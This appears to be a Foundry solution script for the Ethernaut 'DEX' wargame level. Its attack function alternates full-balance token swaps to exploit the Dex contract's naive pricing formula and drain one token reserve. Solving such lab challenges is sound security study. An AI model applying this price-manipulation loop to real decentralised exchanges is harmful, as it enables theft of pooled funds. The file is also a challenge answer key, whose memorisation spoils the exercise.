// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Dex, SwappableToken} from "ethernaut/levels/Dex.sol";

contract Check is CheckScript("DEX") {}

contract Solve is SolveScript("DEX") {
    Dex target;
    SwappableToken private token1;
    SwappableToken private token2;
    uint256 constant MAX_ITERS = 10;

    constructor() {
        target = Dex(instance);
        token1 = SwappableToken(target.token1());
        token2 = SwappableToken(target.token2());
    }

    // utility to return the token balances for the player and DEX
    function balances() private view returns (uint256 pb1, uint256 pb2, uint256 db1, uint256 db2) {
        // player balances
        pb1 = token1.balanceOf(player);
        pb2 = token2.balanceOf(player);

        // dex balances
        db1 = token1.balanceOf(address(target));
        db2 = token2.balanceOf(address(target));
    }

    function attack() public override {
        address from;
        address to;
        uint256 amount;
        uint256 swapAmount;
        uint256 dbTo;
        uint256 dbFrom;

        // loop until we reach max iters or one of the tokens are depleted
        (uint256 pb1, uint256 pb2, uint256 db1, uint256 db2) = balances();
        for (uint256 i = 0; i != MAX_ITERS && db1 > 0 && db2 > 0; ++i) {
            // assign params
            if (i % 2 == 1) {
                (from, to) = (target.token1(), target.token2());
                (dbFrom, dbTo) = (db1, db2);
                amount = pb1;
            } else {
                (from, to) = (target.token2(), target.token1());
                (dbFrom, dbTo) = (db2, db1);
                amount = pb2;
            }

            // check the swap amount
            swapAmount = target.getSwapPrice(from, to, amount);
            if (swapAmount > dbTo) {
                amount = dbFrom;
            }

            // swap
            target.approve(address(target), amount);
            target.swap(from, to, amount);

            // update local balances
            (pb1, pb2, db1, db2) = balances();
        }
    }
}
